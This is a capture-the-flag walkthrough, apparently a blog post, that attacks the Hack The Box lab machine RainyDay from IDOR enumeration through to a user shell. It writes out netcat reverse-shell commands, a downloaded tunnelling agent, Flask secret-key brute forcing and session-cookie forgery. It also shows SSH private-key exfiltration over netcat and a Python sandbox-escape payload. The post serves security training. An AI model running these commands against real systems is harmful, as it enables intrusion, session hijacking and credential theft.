# :game_die: RainyDay Hack The Box Walkthrough - [HTB]

> **Original Source:** [RainyDay Hack The Box Walkthrough - [HTB]](https://infosecwriteups.com/rainyday-hack-the-box-walkthrough-htb-53490f8fb09f)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# RainyDay Hack The Box Walkthrough — [HTB]


Hey, Guys welcome to my blog so today we are going to discuss about Rainyday Hack the box machine which is hard to get the reverse shell.


UserFlag:


First, Using the IDOR vulnerability we need to get the username and password to get the login access of that web page and I found that it is a docker container using this we can able to get the reverse shell and check the process of that machine and get the userflag


If you want to explore that machine you can follow the below step


And port forward that connection to access the internal website of that machine using that website we can be able to get secrete key and using that we can be able to create a session of another user which lead to cookie-session hijacking !!! and using that session we will get the reverse shell of the new docker I check for process using pspy and I found the userflag of that machine

## Recon using Nmap:


So first as usual we start up with our nmap scan

>

STEP 1: nmap -sC -sV 10.10.11.184


In this nmap report, normal ports and services are opened


So let's visit that website


First, add the rainycloud.htb > /etc/host file


On the right side, there is the login page let’s click it and here there is a signup option


I have signed up using the signup option but it throws the error registration is closed


## Enumeration:


So next enumerate the webpage using dirsearch for further information

>

STEP 2: dirsearch -u [http://rainycloud.htb](http://rainycloud.htb)


After, Enumeration I found one interesting directory which is api


Further analyzing this API endpoint I found that


/api/list → contains docker containers


/api/healthcheck → this is available for internal users which means there is an internal website


/api/user/<id> → We can able to get the information about the user


So first we check for /api/user/<id> and we going to use the feroxbuster or dirsearch to brute the directory

>

STEP 3: feroxbuster -u [http://rainycloud.htb/api/user/](http://rainycloud.htb/api/user/) -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt


So first let's check for 1.0,2.0,3.0 because it looks something suspicious


Now you will get the 3 separate usernames and passwords hash


And Next, we going to crack this hash using john the ripper or you can also use the hashcat


So first we need to find the format of this hash


I found the hash format using hashes.com and it bcrypt


Now we going to crack this hash with help of john the ripper

>

STEP 4: john — format=bcrypt — wordlist=rockyou.txt crack


And it takes a long time to crack so please wait patiently


After a long time, it cracked one password which is rubberducky and thus suitable for gary user So let’s go for login


Username: gary Password: rubberducky


So now you will get the login access


After logging in click the new Container and create an alpine docker


Now the alpine container will be get started


After further analyzing this I found


Execute command → You will get the output file


In the Background Execute command → You will not get the output file and this reverse connection will strong


So let's try the Background command Execute


Now we going to execute the netcat command in the background


Before that setup, your reverse connection

>

STEP 5: nc -lvp 7070


Next enter the netcat command in the background command

>

STEP 6: sh -c ‘nc 10.10.x.x 7070 -e /bin/sh’


Booommmm!!!!! Now you will get the docker shell


And you can able to notice that it is a docker environment


After a lot of tries, I have found the host Ip using the arp command


Next, I checked the process of that container


And I find that PID 1197 (1000) is a sleep


Next check that process in /proc/1197


Next, I opened that root directory and finally got the userflag of that machine.


If you want to explore that machine you can follow the below step

## Port Forwarding:


So now we going to Port forward this using venom or chisel


First I tries port forwarding using chisel but it won’t work for me at this point I got frustrated and it stuck for 2 days


After that googling, I found one amazing tool venom I am new to this tool and I don’t how to use the tool


First, download the venom using this link


After downloading transfer the agent_linux_x64 binary to that remote machine ( docker-machine ) using python

>

STEP 6: python3 -m http.server 5050


Note: If anything doesn’t work try to reconnect the reverse shell or change VPN or execute that command again and again

>

STEP 7: wget [http://10.10.xx.xx:5050/agent_linux_x64](http://10.10.xx.xx:5050/agent_linux_x64)


After downloading give executable permission

>

STEP 8: chmod 777 agent_linux_x64


Before that start your venom listener on your local machine

>

STEP 9: ./admin_linux_x64 -lport 3002


Next, go to the remote machine and execute the below command

>

STEP 10: ./agent_linux_x64 -rhost 10.10.16.11 -rport 3002


Booooommm!!!! Now you will get the connection and use the show command to list the connection


>

STEP 11: goto 1


And we going to set up the socks proxy connection

>

STEP 12: socks 1080


Next, go to the /etc/proxychains in your local machine and edit the proxy127.0.0.1 socks 1080


Now we can able to access that internal host IP with proxy chains

>

STEP 13: proxychains nmap -Pn -sT 172.18.0.1


Now you can able to see that some ports are getting an ok response huh!!!


I think there will be a subdomain because the 80 port has been opened so let’s check it

>

STEP 14: ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u [http://FUZZ.rainycloud.htb/](http://FUZZ.rainycloud.htb/) “Host: FUZZ.rainycloud.htb”


Ohhh!! There is a dev subdomain but the status code is 403 I think this is an internal website


## Get Vicky’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


So first open your burpsuite and go to the user option tab in the connection tab you can able to see the socks proxy


Enter the proxy 127.0.0.1 1080 and tick that check box


And next, add the dev.rainycloud.htb >> /etc/hosts file


Now you can able to access that internal website ( dev → developer)


First, log in with the same username and password in dev.rainycloud.htb


Now I going to check some internal directories that we got in the API enumeration


/api/healthcheck → this is available for internal users


Capture this Request in Burpsuite and here you can able to notice that the JWT


So lets us check this in jwt.io and it shows an invalid signature we need a secret key so We need to find the secrete key


## Getting Secret Key:


Further analyzing I have found one idea in Htb Forum and 0xdf


[https://0xdf.gitlab.io/2022/05/14/htb-fingerprint.html](https://0xdf.gitlab.io/2022/05/14/htb-fingerprint.html)


First, we going to change the method to POST and send this below parameter


file=/etc/passwd&type=CUSTOM&pattern=^root.*


Now you get a missing parameter error I don’t know why I’m getting this error ( If you know please comment on it )


After that, I recapture the request and enter the same parameter manually


Booommm!! Now it working but I was stuck in this step for 2 days and As a result, you get the true value if it is false it is not valid


Next, I check the /var/www/rainycloud/app.py because it python file, and It looks interesting I changed the pattern to SECRET_KEY ( Check this in 0xdf article )


file=/var/www/rainycloud/app.py&type=CUSTOM&pattern=^SECRET_KEY*


So now we going to brute force the directory using the ffuf tool until the result become true because we need a secrete key


Here I’m going to the intruder in burpsuite so First, send the repeater request to the intruder and set add $ to fuzz (shown in the below image)


And the wordlist is /seclists/Discovery/Web-content/directory-list-2.3-medium.txt


Copy the wordlist and paste it into the intruder payload


Next, start the attack.


It will take a long time after that you get the secrets.py file → 200 response and the result → true


Booommm!!! We found the secrete Key


Further analyzing this machine I write simple python to brute force the secret key with reference of the 0xdf article ( fingerprint machine )


Download the script using the below link


Next, replace cookie and proxy (Use a different proxy because it disturbs the socks connection)


Next, we going to run the script until it creates the last key because it will brute force multiple create so wait until it cracks it.


At last, it won’t create a and you get the “It wrong” message only.


Using this key we going to override the jack user and hijack that session


To do this we need a tool which is[flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager) because it flask cookie

>

STEP 15: [https://github.com/noraj/flask-session-cookie-manager.git](https://github.com/noraj/flask-session-cookie-manager.git)


Next, create a cookie using the below command

>

STEP 16: python3 flask_session_cookie_manager3.py encode -s f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67 -t “{‘username’:’jack’}”


Booooomm!!! Now the cookie has been created

## Hijacking Session:


First, login into gary user in dev.rainycloud.htb


Next, open the developer tools and go to the storage tab to edit the cookie


Booooomm!!!!! After replacing this cookie you will get the jack session


You can confirm that using the container name which is secret → jack


Before that setup your listener in the local machine

>

STEP 17: nc -lvp 9001


Next, we going to execute the background command

>

STEP 17: sh -c ‘nc 10.10.14.44 9001 -e /bin/sh’


Booooommm!!!! Now you will get the shell


Next, I run the [pspy](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32s) to snoop on the process without needing root privilege and transfer this from the local machine to the remote machine ( jack machine ) using the python server

>

STEP 18: python3 -m http.server 6060


STEP 19: wget [http://10.10.xx.xx:6060/pspys](http://10.10.xx.xx:9001/pspys)


After further analyzing this I found something suspicious


I think this unique PID ( Process ID ) everyone should do this manually


And checked this process

>

STEP 20: cd /proc/1198


STEP 21: ls -al


Boommmmm!!!!!! Here I got /root directory


So enter into this

>

STEP 22: cd root


Booommm!!!! We got something unknown and next I checked the home directory and I get the userflag of that machine

>

STEP 23: cd home


STEP 23: cd jack


STEP 24: cat user.txt


So next send the SSH key to your local machine using netcat


First setup your listener in your netcat

>

STEP 25: nc -lvp 2001 > id_rsa


And next transfer that file to the local machine

>

STEP 26: nc 10.10.xx.xx 2001 < id_rsa


Next, give the executable permission to that file

>

STEP 27: chmod 777 id_rsa


## Jack User Shell:


>

STEP 28: ssh -i id_rsa jack@10.10.11.184


Booom!!! Now you get the user shell


## Jack_Adm User Shell:


After getting the shell I check for sudo binary abuse and I opened that file but the permission has been denied


Next checked In google for any exploit to the python sandbox and I found one interesting article (If need more check out this article)


Using that article I get an exploit for this python sandbox


```
[x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("/bin/bash")
```


Boooomm!! Now you will get that shell

## Root Flag:


Check out Root Part form [Ippsec](https://youtu.be/E5TOeiCnGkE?t=2142)or 0xdf


I won’t be able to solve the root part of that machine and I cannot able to understand that part because I am an intermediate guy and I accepted My defeat…


If you like my writeup please give the applause and if you like my work donate to my OSCP Exam

---

*Originally published on [Medium](https://infosecwriteups.com/rainyday-hack-the-box-walkthrough-htb-53490f8fb09f). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
